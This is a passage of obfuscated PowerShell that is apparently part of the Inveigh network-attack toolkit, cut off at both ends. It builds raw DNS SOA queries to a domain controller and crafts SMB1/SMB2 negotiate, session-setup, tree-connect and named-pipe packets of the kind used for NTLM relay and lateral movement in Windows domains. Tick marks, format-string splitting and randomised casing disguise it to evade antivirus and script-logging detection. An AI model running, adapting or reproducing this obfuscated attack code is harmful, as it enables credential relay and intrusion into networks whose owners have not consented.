            return   $xV8qNB::("{2}{0}{1}"-f'UIn','t16','To').Invoke(${fi`e`LD},0)
        }

        function Co`NvERtf`ROM-`pACKe`T`ordEr`E`DdIcTi`onarY(${o`RDEr`edDICtiO`N`ArY})
        {

            foreach(${f`iE`LD} in ${Or`de`R`EDDi`cTI`onaRy}."vA`lUEs")
            {
                ${bYte_A`RR`AY} += ${F`IELd}
            }

            return ${BYt`e_A`R`RaY}
        }

        function nE`W-ranDOm`ByteA`R`RaY
        {
            param([Int]${Le`NG`TH},[Int]${mI`N`iMum}=1,[Int]${MaX`IMuM}=255)

            [String]${Ra`Ndom} = [String](1..${L`EnG`TH} | FoR`EAcH-Ob`je`cT {"{0:X2}" -f (G`ET-rAN`dOM -Minimum ${M`inimUM} -Maximum ${MAXI`M`UM})})
            [Byte[]]${r`ANdOm} = ${R`ANDOm}.("{1}{0}" -f'plit','S').Invoke(" ") | forEa`ch`-`o`BJeCT{[Char]  (Get`-`VArIab`lE 4vxN ).vAluE::("{0}{1}"-f'ToInt1','6').Invoke(${_},16)}

            return ${raNd`OM}
        }

        function N`Ew-d`NSnA`mEaRr`AY
        {
            param([String]${Na`mE})

            ${chAR`Ac`T`Er_ArRay} = ${N`AMe}.("{1}{2}{3}{0}"-f'y','ToChar','Ar','ra').Invoke()
            [Array]${INd`ex_A`R`RAy} = 0..(${chArActeR_a`RR`Ay}."Co`UNT" - 1) | whERE`-O`Bj`ECT {${cHAract`Er`_`A`RrAY}[${_}] -eq '.'}

            if(${In`D`EX_a`RrAY}."Cou`NT" -gt 0)
            {

                ${N`A`mE_StA`Rt} = 0

                foreach(${I`Nd`EX} in ${IN`DEX_Ar`R`Ay})
                {
                    ${NAM`e_e`Nd} = ${I`NdeX} - ${NaMe`_St`A`Rt}
                    [Byte[]]${Na`me_A`R`Ray} += ${nA`mE_`E`ND}
                    [Byte[]]${Na`me_a`RraY} +=   (  GET-`VAriab`Le  iXgd).VALUE::"Ut`F8".("{2}{0}{1}"-f'tBy','tes','Ge').Invoke(${N`AME}.("{0}{1}{2}" -f 'Sub','strin','g').Invoke(${na`M`e_s`TArt},${NaME`_e`ND}))
                    ${N`AmE`_S`TaRt} = ${i`N`dEx} + 1
                }

                [Byte[]]${NAm`E`_aR`Ray} += (${N`Ame}."l`eNG`Th" - ${na`mE_`s`TaRT})
                [Byte[]]${Name_AR`R`Ay} +=  $iXgD::"U`Tf8".("{0}{1}"-f'G','etBytes').Invoke(${Na`Me}.("{1}{0}{2}"-f 'stri','Sub','ng').Invoke(${nA`mE_`START}))
            }
            else
            {
                [Byte[]]${nAmE_`Ar`RAy} = ${nA`me}."LEng`TH"
                [Byte[]]${Nam`E_`ARRay} +=  (  V`ArIABle  ('Ix'+'gD') -ValUEon  )::"U`Tf8".("{1}{0}{2}" -f'tByte','Ge','s').Invoke(${n`Ame}.("{0}{2}{1}" -f 'S','tring','ubs').Invoke(${NAm`E`_S`TARt}))
            }

            return ${NAm`e_`ArRaY}
        }

        function N`eW-`PA`cK`ETd`NssoAq`UerY
        {
            param([String]${Na`Me})

            [Byte[]]${Ty`PE} = 0x00,0x06
            [Byte[]]${n`Ame} = (Ne`W-D`NSname`AR`RaY ${Na`me}) + 0x00
            [Byte[]]${L`ENGTH} =   (  VARiA`B`Le ("XV8Qn"+"B") -VaLUEonL )::("{0}{1}{2}"-f'G','e','tBytes').Invoke(${NA`ME}."cOU`NT" + 16)[1,0]
            [Byte[]]${tR`A`Ns`ActIo`N_id} = NEW-Ra`N`dOMb`yTeARray 2
            ${dN`SQ`UeRy} = N`e`w-`objECt ("{8}{1}{6}{7}{5}{2}{0}{9}{3}{4}"-f '.OrderedDi','ys','cialized','nar','y','pe','tem.Collections.','S','S','ctio')
            ${D`Nsq`UerY}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}{2}" -f 'Len','gt','h'),${LE`NGtH})
            ${dN`sQu`Ery}.("{1}{0}"-f 'd','Ad').Invoke(("{0}{2}{1}{4}{3}" -f 'T','ns','ra','ID','action'),${tRA`NSacT`I`o`N_id})
            ${dns`qU`Ery}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{0}"-f 'ags','Fl'),[Byte[]](0x01,0x00))
            ${DN`Squ`ERy}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}" -f'Qu','estions'),[Byte[]](0x00,0x01))
            ${Dn`Sque`Ry}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{2}{1}"-f 'A','Rs','nswerR'),[Byte[]](0x00,0x00))
            ${dN`sQu`ERY}.("{0}{1}"-f 'A','dd').Invoke(("{1}{0}{2}" -f'ityRR','Author','s'),[Byte[]](0x00,0x00))
            ${DN`s`QUErY}.("{0}{1}" -f 'A','dd').Invoke(("{3}{1}{2}{0}"-f'alRRs','it','ion','Add'),[Byte[]](0x00,0x00))
            ${dnSQue`RY}.("{1}{0}"-f'd','Ad').Invoke(("{3}{0}{2}{1}" -f'eries_N','me','a','Qu'),${nA`ME})
            ${d`NsQ`UE`Ry}.("{0}{1}"-f 'A','dd').Invoke(("{0}{2}{1}"-f 'Que','ies_Type','r'),${T`YPE})
            ${d`Ns`qUerY}.("{1}{0}" -f'd','Ad').Invoke(("{1}{3}{0}{2}" -f 's_Clas','Que','s','rie'),[Byte[]](0x00,0x01))

            return ${Dns`QU`eRy}
        }

        ${dnS`_Cl`iEnt} = Ne`W-`ObjecT ("{3}{7}{8}{4}{2}{0}{5}{1}{6}" -f'ts.T','Clie','e','Sys','ck','CP','nt','tem.Ne','t.So')
        ${dNs_`C`LIENt}."C`liEnt"."ReCE`IvEti`ME`OUt" = 3000

        try
        {
            ${DNs_`cLIE`Nt}.("{1}{0}{2}"-f'nn','Co','ect').Invoke(${DOmAIncONtR`o`L`ler},"53")
            ${DNS_`c`lienT_st`ReAm} = ${dnS`_`CLiE`Nt}.("{1}{2}{0}" -f 'Stream','G','et').Invoke()
            ${dN`S_CLienT_re`c`eIve} = NEw`-Ob`Je`CT ("{1}{0}{2}"-f'ste','Sy','m.Byte[]') 2048
            ${PaCK`et_dn`s`que`RY} = NEw-pACk`etdn`Ss`OAQ`Uery ${Z`onE}
            [Byte[]]${dns`_ClIE`Nt_Se`ND} = CoNV`ERt`FRO`m-`PA`C`KET`OR`DereDdIction`Ary ${p`Ack`et`_Dn`sQUeRY}
            ${Dn`S_CLienT_`st`Ream}.("{1}{0}" -f'te','Wri').Invoke(${DN`s_`cL`ient_SE`ND},0,${dn`s_CLIEnT_s`ENd}."Len`g`TH") > ${n`ULl}
            ${dNS`_`CLieNT_`sTreAM}.("{0}{1}" -f'Flus','h').Invoke()   
            ${Dn`S_cLieNT`_st`Ream}.("{0}{1}"-f 'Re','ad').Invoke(${dNs_C`LIe`N`T_Re`cE`iVE},0,${DNS`_c`liENt`_RE`cEive}."LE`N`gth") > ${N`ULL}
            ${dNs`_Cl`I`eNT}.("{1}{0}"-f 'se','Clo').Invoke()
            ${d`NS_CliEnT`_sT`R`eAM}.("{0}{1}"-f 'C','lose').Invoke()

            if(${DN`s`_CLiENt_RE`cE`I`Ve}[9] -eq 0)
            {
                ${INv`EIgH}."O`UtpUT_`q`UEuE"."a`dd"(('['+'-] '+"$Zone "+'SOA'+' '+'r'+'ecord '+'no'+'t '+'fo'+'und')) > ${Nu`LL}
            }
            else
            {
                ${Dns`_`REPLy_`Co`NvEr`TeD} =  (vaR`IAb`LE  xv8qNB  ).vALUe::("{1}{0}{2}" -f 'oSt','T','ring').Invoke(${dn`s_CLieNT`_recE`IVE})
                ${Dns_re`plY_C`oN`VeRtED} = ${DNs_RE`p`lY_cO`N`VERtEd} -replace "-",""
                ${sOA_`ANs`We`R_indEx} = ${dN`S_Re`Pl`y_c`o`NvErtEd}.("{0}{1}"-f'Inde','xOf').Invoke(("{1}{3}{2}{0}" -f '1','C','0','00C000600'))
                ${Soa_aNSw`e`R_Ind`EX} = ${Soa_an`sW`ER_`indEx} / 2
                ${SOa_LE`NG`TH} = ${DNS_cL`IE`Nt`_REcE`i`Ve}[(${s`oa`_aN`S`wEr_inDEX} + 10)..(${so`A_`ANSwE`R_IN`dEX} + 11)]
                ${S`oa_`l`EnGTh} = C`Onve`Rt-D`At`Atoui`Nt16 ${SoA_le`N`GtH}
                [Byte[]]${SOa`_SERI`A`l_CUr`ReN`T_ArRAY} = ${dns_cL`ien`T_`REce`ivE}[(${sO`A_AnsW`er_i`N`DeX} + ${S`oA_len`GTH} - 8)..(${soA`_aNs`Wer_iN`d`eX} + ${S`oA_l`engTH} - 5)]
                ${Soa_`sE`RIAL_CuR`ReNt} =  (  g`E`T-C`hil`dITEm vaRIABle:xv8qNB  ).vaLue::"T`ouin`T32"(${SoA_S`erIal_`cu`RrENT_A`RRAy}[3..0],0) + 1
                [Byte[]]${S`Oa`_seRI`AL_Num`B`eR_a`RRaY} =  $xV8qNB::("{1}{2}{0}"-f's','GetBy','te').Invoke(${soa_s`e`RIaL_cu`RRENT})[0..3]
            }

        }
        catch
        {
            ${i`N`VEigH}."OUTpu`T`_`QueUE"."A`dd"(('[-]'+' '+"$DomainController "+'did'+' '+'n'+'ot '+'re'+'s'+'pond '+'o'+'n '+'TC'+'P '+'por'+'t '+'53')) > ${n`UlL}
        }

        return [Byte[]]${so`A_`sERiA`L_nUm`BEr_`ArR`AY}
    }

}


${p`ACke`T_`FUncTIONS_s`crI`PTb`LoCk} =
{
    function coNV`erT`FrOM-pAcke`ToRde`REd`D`ICt`Io`N`A`RY
    {
        param(${oRDeR`EDdICT`I`oNaRY})

        ForEach(${fie`ld} in ${O`R`D`EReddic`TIONA`RY}."V`ALueS")
        {
            ${b`yTE_a`RrAY} += ${fie`ld}
        }

        return ${BYt`E_`ARraY}
    }

    function gET-`PRO`CesSidA`RRaY
    {
        ${P`Roces`s`_id} =  $Bwe7do::("{1}{3}{2}{4}{0}" -f'ocess','GetCu','P','rrent','r').Invoke() | Se`L`eCt-O`BjeCt -expand ('id')
        ${P`ROcE`ss_`iD} =   (  gI  ("vAR"+"iABl"+"e:xv8"+"qN"+"b")).vaLue::"to`strI`Ng"( ( GET-V`ArI`ABLe ('XV8qN'+'b')  ).VALue::("{1}{2}{0}" -f'es','Ge','tByt').Invoke(${P`RO`c`ess_id}))
        [Byte[]]${p`R`o`CeSs_id} = ${pr`O`CesS`_id}.("{1}{0}"-f 'plit','S').Invoke("-") | F`Or`E`Ach-OBject{[Char]  (  d`iR  ("V"+"a"+"rI"+"Ab"+"le:4VXN") ).vAluE::("{1}{0}" -f 'oInt16','T').Invoke(${_},16)}

        return ${P`R`o`cESs_id}
    }


    

    function nEw`-pAcket`NE`T`Bio`s`Session`SErvice
    {
        param([Int]${h`e`AdEr`LeNgTH},[Int]${D`At`AlEngtH})
    
        [Byte[]]${Le`N`GTH} = (  $xv8QnB::("{2}{0}{1}"-f'etB','ytes','G').Invoke(${He`ADErlEN`gTH} + ${dat`A`l`eNgTh}))[2..0]
    
        ${netbioS`SeSsi`oN`ser`V`iCE} = N`EW-oBJ`e`CT ("{10}{12}{11}{2}{6}{0}{8}{9}{7}{4}{1}{5}{3}" -f'ons.Sp','.Ord','.Co','onary','ed','eredDicti','llecti','aliz','e','ci','Syst','m','e')
        ${nET`BI`oSs`Es`s`iONseRvI`cE}.("{0}{1}" -f 'Ad','d').Invoke(("{2}{0}{1}" -f 's','sageType','Me'),[Byte[]](0x00))
        ${nEt`BI`OSSESs`iONsERv`iCE}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}{2}" -f 'engt','L','h'),${l`ENgTH})
    
        return ${NET`B`ioSS`EssiONSErV`Ice}
    }

    

    function NEw`-pac`K`etSMbheAd`er
    {
        param([Byte[]]${COm`mA`ND},[Byte[]]${f`L`AGS},[Byte[]]${Fl`Ag`S2},[Byte[]]${treE`id},[Byte[]]${P`ROC`E`Ssid},[Byte[]]${U`seR`iD})
    
        ${P`Roce`SSId} = ${P`ROCe`sSId}[0,1]
    
        ${s`mbheAd`eR} = Ne`W-O`BjeCT ("{5}{3}{1}{4}{7}{0}{6}{2}" -f 'ns.Sp','.','eredDictionary','ystem','Coll','S','ecialized.Ord','ectio')
        ${S`MbhEA`DeR}.("{1}{0}"-f 'dd','A').Invoke(("{0}{1}" -f 'P','rotocol'),[Byte[]](0xff,0x53,0x4d,0x42))
        ${S`m`BhEAdEr}.("{0}{1}"-f 'Ad','d').Invoke(("{1}{0}{2}"-f 'om','C','mand'),${c`om`Mand})
        ${SmBH`EAd`Er}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}{2}" -f 'Erro','rCl','ass'),[Byte[]](0x00))
        ${SMBHe`Ad`eR}.("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{2}"-f 'rv','Rese','ed'),[Byte[]](0x00))
        ${S`M`B`HEADeR}.("{0}{1}" -f'A','dd').Invoke(("{1}{2}{0}"-f 'de','ErrorC','o'),[Byte[]](0x00,0x00))
        ${Sm`Bh`EAdER}.("{0}{1}"-f'A','dd').Invoke(("{1}{0}"-f 's','Flag'),${Fl`A`GS})
        ${s`mBhE`AdEr}.("{0}{1}" -f'Ad','d').Invoke(("{0}{1}" -f 'F','lags2'),${F`l`AGS2})
        ${SMBH`e`A`DER}.("{1}{0}" -f 'dd','A').Invoke(("{3}{0}{4}{2}{1}" -f 'ocessI','h','Hig','Pr','D'),[Byte[]](0x00,0x00))
        ${s`Mbh`eA`dEr}.("{1}{0}" -f'dd','A').Invoke(("{0}{2}{1}" -f 'Si','re','gnatu'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${sMBheA`D`ER}.("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}" -f'R','rved2','ese'),[Byte[]](0x00,0x00))
        ${sMbHEA`d`Er}.("{0}{1}"-f'A','dd').Invoke(("{0}{2}{1}" -f 'Tree','D','I'),${TR`EeID})
        ${S`M`BHeAdeR}.("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{1}{3}" -f 'roc','ess','P','ID'),${PrOCE`sS`id})
        ${s`mbhE`Ader}.("{0}{1}" -f'A','dd').Invoke(("{1}{0}"-f 'rID','Use'),${uS`Er`Id})
        ${SMBh`e`AdeR}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}{3}" -f'M','ltiple','u','xID'),[Byte[]](0x00,0x00))
    
        return ${sm`BHEA`DEr}
    }
    function nEW-Pa`cket`S`mbNEGOt`ia`T`E`PRotoC`oLrEqu`E`ST
    {
        param([String]${vER`si`ON})
    
        if(${ve`Rs`ion} -eq ("{1}{0}"-f 'MB1','S'))
        {
            [Byte[]]${bytE`_C`OUnT} = 0x0c,0x00
        }
        else
        {
            [Byte[]]${B`yT`E_couNt} = 0x22,0x00  
        }
    
        ${sM`BneGOTIatePr`ot`O`CoL`ReQueST} = NEw-`obj`eCt ("{9}{0}{6}{11}{2}{10}{4}{8}{12}{3}{7}{1}{5}" -f'y','nar','c','eredDict','.S','y','stem.Co','io','pecialized.Or','S','tions','lle','d')
        ${s`Mbn`E`gOtiATePrOt`OcOlreQueSt}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}"-f 'dCount','Wor'),[Byte[]](0x00))
        ${smb`NeG`oTiatEProT`O`Co`lREquEST}.("{1}{0}" -f 'dd','A').Invoke(("{2}{3}{1}{0}"-f't','n','B','yteCou'),${bYtE`_`couNt})
        ${SmbnEGo`TIaTEpR`ot`O`coLR`EqU`est}.("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{9}{7}{2}{10}{4}{6}{5}{3}{8}"-f'tedDi','Reques','ts_','Buffe','l','_','ect','ec','rFormat','al','Dia'),[Byte[]](0x02))
        ${s`MBn`egOtiAT`epROTocOlR`EQuESt}.("{1}{0}"-f 'dd','A').Invoke(("{3}{6}{1}{0}{4}{2}{5}"-f '_Dia','estedDialects','t_','Req','lec','Name','u'),[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))
    
        if(${VeR`Si`ON} -ne ("{0}{1}"-f 'SMB','1'))
        {
            ${SMB`NE`GOTiA`TePRoTOC`oL`ReQuest}.("{0}{1}"-f'Ad','d').Invoke(("{3}{6}{9}{0}{5}{4}{2}{7}{8}{1}"-f'D','at2','fer','Req','Buf','ialect_','uestedD','F','orm','ialects_'),[Byte[]](0x02))
            ${s`MBNeGOtiat`E`pRO`To`Colr`e`QUesT}.("{0}{1}" -f'A','dd').Invoke(("{3}{1}{0}{5}{4}{2}" -f'dDiale','te','2','Reques','ts_Dialect_Name','c'),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            ${sM`BNEGo`T`iaTEp`RotOcol`REqUEST}.("{1}{0}"-f'd','Ad').Invoke(("{9}{0}{4}{8}{3}{7}{2}{1}{5}{6}" -f'es','fferFor','alect_Bu','l','t','mat','3','ects_Di','edDia','Requ'),[Byte[]](0x02))
            ${sMbN`eGO`TIAtEP`ROtOC`Olr`e`Qu`e`ST}.("{1}{0}" -f 'd','Ad').Invoke(("{9}{4}{7}{2}{6}{0}{8}{3}{1}{5}" -f'_','N','lect','ect_','tedD','ame3','s','ia','Dial','Reques'),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }
    
        return ${sMBn`EGO`Tia`TEPR`O`T`OCoLrE`QuEST}
    }
    
    

    function N`EW`-PaCKEtSmB`2He`ADer
    {
        param([Byte[]]${c`o`mMAND},[Byte[]]${Cre`DITR`EQ`UE`St},[Bool]${sIG`NI`Ng},[Int]${MessA`g`EId},[Byte[]]${p`R`OcES`Sid},[Byte[]]${tr`e`eID},[Byte[]]${Se`SS`IoNID})
    
        if(${s`Ig`Ning})
        {
            ${fLa`gs} = 0x08,0x00,0x00,0x00      
        }
        else
        {
            ${Fla`gS} = 0x00,0x00,0x00,0x00
        }
    
        [Byte[]]${mEssA`ge_`iD} =   (g`eT-`VaRiablE xV8Qnb  ).vaLUe::("{0}{1}" -f'G','etBytes').Invoke(${mEss`Age`id})
    
        if(${m`Es`SAgE_id}."LE`NgtH" -eq 4)
        {
            ${mess`A`gE_`iD} += 0x00,0x00,0x00,0x00
        }
    
        ${smB`2Head`er} = N`eW-`ObJEcT ("{3}{6}{2}{5}{0}{4}{1}{7}"-f'alized.O','ti','Collec','Sy','rderedDic','tions.Speci','stem.','onary')
        ${SmB2h`eA`DeR}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f 'Pr','lID','otoco'),[Byte[]](0xfe,0x53,0x4d,0x42))
        ${S`Mb2hE`A`DeR}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{3}{1}"-f 'S','uctureSize','t','r'),[Byte[]](0x40,0x00))
        ${SMB`2HE`ADEr}.("{1}{0}" -f'dd','A').Invoke(("{0}{1}{2}" -f 'Cred','itCh','arge'),[Byte[]](0x01,0x00))
        ${SmB`2hEa`deR}.("{0}{1}"-f'Ad','d').Invoke(("{1}{2}{3}{0}" -f'ence','C','h','annelSequ'),[Byte[]](0x00,0x00))
        ${Smb`2hEA`deR}.("{0}{1}" -f 'A','dd').Invoke(("{2}{0}{1}"-f'erv','ed','Res'),[Byte[]](0x00,0x00))
        ${sm`B2hE`A`Der}.("{1}{0}" -f'dd','A').Invoke(("{0}{1}" -f'Comman','d'),${c`oMMaNd})
        ${SmB`2`He`ADer}.("{0}{1}" -f 'Ad','d').Invoke(("{0}{1}{3}{2}" -f'Credi','tReq','t','ues'),${C`R`eDitreQ`U`EsT})
        ${sm`B2`HeA`DER}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}" -f 'gs','Fla'),${F`l`AGS})
        ${S`mB2H`EAdEr}.("{1}{0}"-f'dd','A').Invoke(("{3}{2}{0}{1}" -f'om','mand','C','Next'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sM`B2`h`EAder}.("{1}{0}"-f 'dd','A').Invoke(("{1}{0}{2}"-f'a','Mess','geID'),${mes`sA`GE_id})
        ${sm`B2H`EAdEr}.("{0}{1}"-f'A','dd').Invoke(("{2}{1}{0}" -f'D','ocessI','Pr'),${pr`o`cesSid})
        ${SMB`2he`A`DeR}.("{1}{0}" -f 'dd','A').Invoke(("{2}{1}{0}"-f'ID','e','Tre'),${TRe`e`ID})
        ${sMb2h`E`ADER}.("{1}{0}"-f'dd','A').Invoke(("{0}{3}{2}{1}"-f 'Se','nID','o','ssi'),${ses`SI`ONID})
        ${smb2`hEa`d`er}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{1}{0}"-f'e','ignatur','S'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    
        return ${SM`B2h`Ead`ER}
    }
    
    function NEw`-PackETs`mb2NeG`ot`iatEpr`OtOco`LR`eQUeST
    {
        ${sMb2neG`o`TI`A`Te`PrOtOCOlRe`qUE`St} = nEW`-obJ`ECT ("{11}{7}{5}{10}{1}{3}{0}{6}{9}{12}{4}{2}{8}"-f'Speci','ction','ar','s.','n','m.Co','alized.','ste','y','OrderedDict','lle','Sy','io')
        ${SM`B2neGo`TiATEPROtOC`olR`e`que`sT}.("{0}{1}" -f 'A','dd').Invoke(("{0}{1}{2}"-f 'S','tructureSi','ze'),[Byte[]](0x24,0x00))
        ${SMb`2NeGOTIAteP`R`oto`c`OLrEQuEST}.("{1}{0}" -f 'dd','A').Invoke(("{0}{1}{2}"-f'Diale','c','tCount'),[Byte[]](0x02,0x00))
        ${smB`2`NEG`OtIatEP`RoTOCOlRe`q`UeSt}.("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}"-f'Mode','Se','ty','curi'),[Byte[]](0x01,0x00))
        ${SMb2N`E`gOtI`AT`E`P`RotOCoLR`eqUe`ST}.("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{2}"-f'e','R','served'),[Byte[]](0x00,0x00))
        ${S`m`B2N`EGOt`IATe`prOt`ocOLreQUeSt}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{3}{2}{1}" -f 'Capabi','s','tie','li'),[Byte[]](0x40,0x00,0x00,0x00))
        ${sm`B2n`EGO`T`i`Ate`Pr`OTOCOLr`Equest}.("{1}{0}"-f'dd','A').Invoke(("{3}{2}{1}{0}"-f 'ID','GU','ent','Cli'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${S`mB`2nEg`OTia`Tep`RO`TOCOLre`q`UEsT}.("{0}{1}" -f 'A','dd').Invoke(("{4}{2}{0}{3}{1}"-f 'Cont','fset','gotiate','extOf','Ne'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sMB2n`e`GoTIA`TePRotOC`O`Lr`eQ`UeSt}.("{1}{0}" -f'd','Ad').Invoke(("{4}{3}{2}{0}{1}"-f 'tC','ount','ntex','egotiateCo','N'),[Byte[]](0x00,0x00))
        ${sMb2Ne`goTI`ATeP`RO`TocOlrequ`E`St}.("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}{2}" -f'Re','se','rved2'),[Byte[]](0x00,0x00))
        ${Smb`2N`e`gotI`A`TePROtOc`o`lreQUEST}.("{0}{1}" -f'A','dd').Invoke(("{0}{1}"-f'Dialec','t'),[Byte[]](0x02,0x02))
        ${S`m`B2N`egO`TIa`TEP`RoTO`ColRequest}.("{0}{1}" -f 'A','dd').Invoke(("{0}{1}"-f'D','ialect2'),[Byte[]](0x10,0x02))
    
        return ${SMB2nE`GOtIa`TeP`ROtOc`OlrEQue`St}
    }
    
    function NEw-p`AcKe`TSMB2Sess`i`onse`TuP`ReQueSt
    {
        param([Byte[]]${seCuR`IT`YBlob})
    
        [Byte[]]${sE`CUr`I`Ty`_BUF`Fe`R_`lengTh} = ( (  C`hIlDitEm  VariabLe:Xv8QNB  ).Value::("{1}{0}{2}"-f'tBy','Ge','tes').Invoke(${SEcUR`itY`BLob}."lE`NGTh"))[0,1]
    
        ${Smb2`SeSsI`oN`seTuprEq`UesT} = nEw-oB`j`ECT ("{5}{3}{8}{2}{10}{6}{0}{1}{9}{4}{7}{11}"-f 'iz','ed','p','io','OrderedD','System.Collect','l','ictio','ns.S','.','ecia','nary')
        ${SMB2`s`eSSiONsE`TuPre`QUE`ST}.("{0}{1}"-f 'A','dd').Invoke(("{2}{4}{0}{3}{1}"-f'eS','ze','S','i','tructur'),[Byte[]](0x19,0x00))
        ${sM`B2SeSS`iO`N`seT`UPReQuESt}.("{1}{0}" -f 'dd','A').Invoke(("{1}{0}"-f'gs','Fla'),[Byte[]](0x00))
        ${s`mB`2SeSS`IOnS`ETUpREQUeST}.("{1}{0}"-f 'dd','A').Invoke(("{3}{0}{2}{1}"-f 'ecu','ode','rityM','S'),[Byte[]](0x01))
        ${SM`B2`sESsiOnSEtU`PrEQU`est}.("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}" -f 'C','lities','apabi'),[Byte[]](0x00,0x00,0x00,0x00))
        ${smB`2seSS`Ion`sE`Tu`PReQ`UEst}.("{0}{1}"-f'Ad','d').Invoke(("{0}{1}" -f 'Cha','nnel'),[Byte[]](0x00,0x00,0x00,0x00))
        ${sM`B2s`EssiOnsET`Up`Requ`E`St}.("{1}{0}"-f'd','Ad').Invoke(("{3}{1}{5}{4}{2}{0}" -f 'et','t','s','Securi','ferOff','yBuf'),[Byte[]](0x58,0x00))
        ${s`mb2SESSi`onsE`Tup`R`EQueSt}.("{1}{0}"-f 'dd','A').Invoke(("{2}{5}{4}{0}{3}{1}" -f'ffer','gth','S','Len','u','ecurityB'),${seCURit`Y_BUF`F`Er_len`Gth})
        ${Smb2`SEs`si`On`setu`pReque`ST}.("{0}{1}"-f 'A','dd').Invoke(("{2}{3}{0}{1}"-f 'iousSess','ionID','Pr','ev'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${SmB`2`SessIO`NsEtUPReQ`UeSt}.("{0}{1}" -f'A','dd').Invoke(("{1}{0}" -f'r','Buffe'),${secU`RI`Ty`BLob})
    
        return ${smB`2sESs`I`onseT`Up`REQu`ESt} 
    }
    
    function nEw`-P`AcKetS`MB2`TR`eEC`ONNeCTR`EquesT
    {
        param([Byte[]]${B`UffEr})
    
        [Byte[]]${Pa`TH_lEn`gth} = ( $Xv8QNB::("{0}{1}{2}" -f'Ge','tB','ytes').Invoke(${B`U`FFer}."L`enG`Th"))[0,1]
    
        ${smB`2tREeC`oNn`E`Ct`R`EQUEsT} = nEw-obJ`E`cT ("{7}{11}{0}{9}{1}{3}{2}{5}{4}{8}{10}{6}"-f'lle','t','cial','ions.Spe','.Or','ized','tionary','System','deredDi','c','c','.Co')
        ${SMb2`TR`eE`ConnEC`TrE`Qu`EST}.("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}" -f 'ize','Struc','tureS'),[Byte[]](0x09,0x00))
        ${smB2tRE`e`cON`NeCtREQU`EST}.("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}" -f'ved','Re','ser'),[Byte[]](0x00,0x00))
        ${smB`2tReecOn`NectrEQ`Ue`sT}.("{1}{0}" -f 'd','Ad').Invoke(("{2}{0}{1}"-f 'athOff','set','P'),[Byte[]](0x48,0x00))
        ${SMb`2tRe`eConNEct`REQ`U`esT}.("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}"-f'P','Length','ath'),${PatH_LE`N`GTh})
        ${smB2Tre`eCon`N`eCtRe`QUesT}.("{0}{1}"-f'Ad','d').Invoke(("{1}{0}{2}" -f 'e','Buff','r'),${B`Uf`FER})
    
        return ${Smb`2tR`E`eC`O`Nn`ECtrequest}
    }
    
    function NE`w-pAc`K`eTSMb2cre`A`T`eREquE`St`FiLE
    {
        param([Byte[]]${NAME`dP`iPE})
    
        ${Na`me_lEn`gTh} = ( ( vArI`AB`le  ("X"+"V8qN"+"b") -VALUe)::("{1}{0}{2}" -f'etByt','G','es').Invoke(${nAM`Ed`Pipe}."LeNg`TH"))[0,1]
    
        ${SMB2c`REATERE`qU`Est`FilE} = Ne`w`-ObjECt ("{4}{2}{8}{5}{0}{1}{3}{6}{7}" -f'zed.','O','ons.Spe','rd','System.Collecti','i','er','edDictionary','cial')
        ${s`mB2CrE`A`Te`REque`STf`iLe}.("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}" -f'e','Str','uctureSiz'),[Byte[]](0x39,0x00))
        ${sm`B2`creA`Te`R`EQu`eStFIlE}.("{1}{0}" -f 'd','Ad').Invoke(("{0}{1}"-f 'Fl','ags'),[Byte[]](0x00))
        ${smB2Cr`eaT`EREquES`Tfi`LE}.("{1}{0}"-f'd','Ad').Invoke(("{4}{3}{0}{2}{5}{1}" -f'st','evel','edOplo','ue','Req','ckL'),[Byte[]](0x00))
        ${Sm`B2CRe`At`eReq`UEST`F`Ile}.("{0}{1}" -f'A','dd').Invoke(("{0}{2}{3}{4}{1}" -f 'I','tion','m','pe','rsona'),[Byte[]](0x02,0x00,0x00,0x00))
        ${smB2cr`E`A`TEReQ`Ues`Tf`IlE}.("{1}{0}" -f 'dd','A').Invoke(("{1}{2}{0}"-f'eFlags','SMBCre','at'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${S`Mb2c`ReatErEQU`eStf`ilE}.("{1}{0}"-f'd','Ad').Invoke(("{0}{2}{1}" -f'Reserv','d','e'),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${S`m`B2creaT`EReQU`E`sTFI`le}.("{0}{1}" -f 'A','dd').Invoke(("{2}{3}{1}{0}"-f 'ss','e','Desire','dAcc'),[Byte[]](0x03,0x00,0x00,0x00))
